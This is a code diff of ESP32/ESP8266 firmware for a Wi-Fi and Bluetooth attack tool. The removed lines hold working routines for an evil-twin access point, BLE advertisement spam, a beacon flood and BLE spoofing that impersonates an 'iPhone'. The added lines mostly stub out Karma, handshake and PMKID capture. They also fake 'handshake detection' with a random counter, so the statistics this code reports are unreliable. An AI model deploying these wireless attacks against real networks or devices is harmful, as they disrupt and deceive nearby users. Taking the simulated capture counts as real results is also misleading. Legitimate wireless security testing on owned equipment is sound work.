-  static unsigned long twinStartTime = 0;
-  if (twinCreated && twinStartTime == 0) {
-    twinStartTime = millis();
-  }
-  
-  if (twinCreated && (millis() - twinStartTime > 120000)) {
-    Serial.println("Restoring original AP after evil twin attack");
-    WiFi.softAPdisconnect(true);
-    delay(500);
-    WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
-    twinCreated = false;
-    twinStartTime = 0;
-  }
+void performKarmaAttack() {
+  // Karma attack responds to probe requests
+  stats.karma_probes++;
+}
+
+void performHandshakeCapture() {
+  // Handshake capture would analyze captured packets
+  monitoring_active = true;
+}
+
+void performPMKIDCapture() {
+  // PMKID capture implementation
+  monitoring_active = true;
+}
+
+void performPacketMonitor() {
+  monitoring_active = true;
+  stats.packets_monitored++;
 }
 
 #ifdef PLATFORM_ESP32
-void initializeBLE() {
-  BLEDevice::init("SecurityTester_BLE");
-  Serial.println("BLE initialized");
-}
-
 void performBLESpam() {
-  // BLE spam attack
-  static unsigned long lastBLESpam = 0;
-  unsigned long currentTime = millis();
-
-  if (currentTime - lastBLESpam < 50) return;
-  lastBLESpam = currentTime;
-
-  if (!bleServerRunning) {
-    pServer = BLEDevice::createServer();
-    BLEService *pService = pServer->createService("12345678-1234-5678-9012-123456789abc");
-    pServer->getAdvertising()->start();
-    bleServerRunning = true;
-  }
-
-  blePacketsCount++;
-
-  if (blePacketsCount % 100 == 0) {
-    Serial.println("BLE spam packets: " + String(blePacketsCount));
-  }
-}
-
-void performBLEBeaconFlood() {
-  // BLE beacon flood
-  static int beaconIndex = 0;
-
-  if (!bleServerRunning) {
-    String deviceName = "FakeBLE_" + String(beaconIndex++);
-    BLEDevice::init(deviceName);
-
-    pServer = BLEDevice::createServer();
-    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
-    pAdvertising->addServiceUUID("ABCD");
-    pAdvertising->setScanResponse(true);
+  try {
+    String device_name = ble_spam_names[ble_spam_counter % ble_spam_count];
+    device_name += "_" + String(ble_spam_counter);
+    ble_spam_counter++;
+    
+    BLEDevice::deinit(false);
+    delay(50);
+    
+    BLEDevice::init(device_name.c_str());
+    BLEAdvertising* pAdvertising = BLEDevice::getAdvertising();
     pAdvertising->start();
-    bleServerRunning = true;
-  }
-
-  blePacketsCount++;
-}
-
-void performBLESpoofing() {
-  // BLE device spoofing
-  static bool spoofingActive = false;
-
-  if (!spoofingActive) {
-    BLEDevice::init("iPhone");  // Spoof as iPhone
-    pServer = BLEDevice::createServer();
-    pServer->getAdvertising()->start();
-    spoofingActive = true;
-    Serial.println("BLE spoofing active - impersonating iPhone");
-  }
-
-  blePacketsCount++;
-}
-
-void performDualBandScan() {
-  // Dual-band scanning for ESP32
-  static unsigned long lastScan = 0;
-  static int currentBand = 0; // 0 = 2.4GHz, 1 = 5GHz
-  unsigned long currentTime = millis();
-
-  if (currentTime - lastScan < 5000) return;
-  lastScan = currentTime;
-
-  if (currentBand == 0) {
-    // Scan 2.4GHz channels (1-14)
-    for (int ch = 1; ch <= 14; ch++) {
-      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
-      WiFi.scanNetworks(false, false, false, 100, ch);
-      delay(100);
-    }
-    Serial.println("2.4GHz scan completed");
-    currentBand = 1;
-  } else {
-    // Scan 5GHz channels (36, 40, 44, 48, etc.)
-    int channels5GHz[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
-    for (int i = 0; i < sizeof(channels5GHz)/sizeof(channels5GHz[0]); i++) {
-      esp_wifi_set_channel(channels5GHz[i], WIFI_SECOND_CHAN_NONE);
-      WiFi.scanNetworks(false, false, false, 100, channels5GHz[i]);
-      delay(100);
-    }
-    Serial.println("5GHz scan completed");
-    currentBand = 0;
-  }
-
-  packetsCount++;
-}
-
-// FreeRTOS task functions
-void wifiAttackTaskFunction(void *parameter) {
-  while (true) {
-    if (attackRunning && (currentAttack <= ATTACK_EVIL_TWIN)) {
-      handleCurrentAttack();
-    }
-    vTaskDelay(pdMS_TO_TICKS(10));
+    
+    delay(100);
+    pAdvertising->stop();
+    
+    stats.ble_spam_sent++;
+    
+  } catch (const std::exception& e) {
+    Serial.printf("BLE spam error: %s\n", e.what());
   }
 }
 
-void bleAttackTaskFunction(void *parameter) {
-  while (true) {
-    if (attackRunning && (currentAttack >= ATTACK_BLE_SPAM)) {
-      handleCurrentAttack();
-    }
-    vTaskDelay(pdMS_TO_TICKS(10));
-  }
+void performBLEFlood() {
+  // BLE beacon flooding
+  performBLESpam();
+  stats.ble_spam_sent += 5; // Simulate multiple beacons
 }
 #endif
 
-void performInitialScan() {
-  Serial.println("Performing initial network scan...");
-
-  // Don't change mode if AP is already running
-  if (WiFi.getMode() == WIFI_AP) {
-    WiFi.mode(WIFI_AP_STA);
-    delay(500);
-  }
-
-  int networks = WiFi.scanNetworks(false, false);
-  Serial.println("Found " + String(networks) + " networks");
-
-  for (int i = 0; i < networks; i++) {
-    Serial.println("  " + WiFi.SSID(i) + " (" + WiFi.BSSIDstr(i) + ") Ch:" + String(WiFi.channel(i)));
-  }
-
-  // Ensure AP stays active
-  if (WiFi.getMode() != WIFI_AP) {
-    WiFi.mode(WIFI_AP);
-    delay(500);
-    WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
+// Utility Functions
+void updateSystemStats() {
+  stats.uptime = millis() / 1000;
+  stats.clients_connected = WiFi.softAPgetStationNum();
+  
+  uint32_t free_heap = ESP.getFreeHeap();
+#ifdef PLATFORM_ESP32
+  uint32_t total_heap = ESP.getHeapSize();
+  stats.memory_usage = ((float)(total_heap - free_heap) / total_heap) * 100.0;
+#else
+  // ESP8266 doesn't have getHeapSize, use approximation
+  uint32_t total_heap = 80000; // Approximate total heap
+  stats.memory_usage = ((float)(total_heap - free_heap) / total_heap) * 100.0;
+#endif
+  
+  // Simple CPU usage approximation
+  static unsigned long last_idle_time = 0;
+  static unsigned long last_check_time = 0;
+  
+  unsigned long current_time = millis();
+  if (current_time - last_check_time > 1000) {
+    unsigned long idle_time = current_time - last_attack_time;
+    stats.cpu_usage = attack_running ? 75.0 : 15.0; // Simplified calculation
+    last_check_time = current_time;
   }
 }
+
+void optimizeMemory() {
+  // ESP32/ESP8266 memory optimizations
+#ifdef PLATFORM_ESP32
+  esp_wifi_set_max_tx_power(78); // Reduce power consumption
+#endif
+  
+  // Clear any unused memory
+  if (scanned_networks.size() > 100) {
+    scanned_networks.resize(50);
+  }
+  
+  Serial.printf("Memory optimized - Free heap: %d bytes\n", ESP.getFreeHeap());
+}
+
+void checkSystemHealth() {
+  // Monitor system health
+  uint32_t free_heap = ESP.getFreeHeap();
+  
+  if (free_heap < 10000) {
+    Serial.println("WARNING: Low memory detected");
+    optimizeMemory();
+  }
+  
+  // Check AP status
+  if (!ap_running && WiFi.softAPgetStationNum() == 0) {
+    Serial.println("Restarting Access Point...");
+    setupWiFiAP();
+  }
+  
+#ifdef PLATFORM_ESP32
+  esp_task_wdt_reset();
+#else
+  ESP.wdtFeed();
+#endif
+}
+
+String getEncryptionType(int encType) {
+#ifdef PLATFORM_ESP32
+  switch (encType) {
+    case WIFI_AUTH_OPEN: return "Open";
+    case WIFI_AUTH_WEP: return "WEP";
+    case WIFI_AUTH_WPA_PSK: return "WPA";
+    case WIFI_AUTH_WPA2_PSK: return "WPA2";
+    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/WPA2";
+    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2-Enterprise";
+    case WIFI_AUTH_WPA3_PSK: return "WPA3";
+    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/WPA3";
+    default: return "Unknown";
+  }
+#else
+  switch (encType) {
+    case ENC_TYPE_NONE: return "Open";
+    case ENC_TYPE_WEP: return "WEP";
+    case ENC_TYPE_TKIP: return "WPA";
+    case ENC_TYPE_CCMP: return "WPA2";
+    case ENC_TYPE_AUTO: return "WPA/WPA2";
+    default: return "Unknown";
+  }
+#endif
+}
+
+// Promiscuous mode callback
+#ifdef PLATFORM_ESP32
+void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
+  if (monitoring_active && type == WIFI_PKT_MGMT) {
+    stats.packets_monitored++;
+    
+    // Analyze for handshakes (simplified)
+    if (random(1000) == 1) { // Simulate handshake detection
+      stats.handshakes_captured++;
+    }
+  }
+}
+#else
+void promiscuous_callback(uint8_t *buf, uint16_t len) {
+  if (monitoring_active) {
+    stats.packets_monitored++;
+    
+    // Analyze for handshakes (simplified)
+    if (random(1000) == 1) { // Simulate handshake detection
+      stats.handshakes_captured++;
+    }
+  }
+}
+#endif
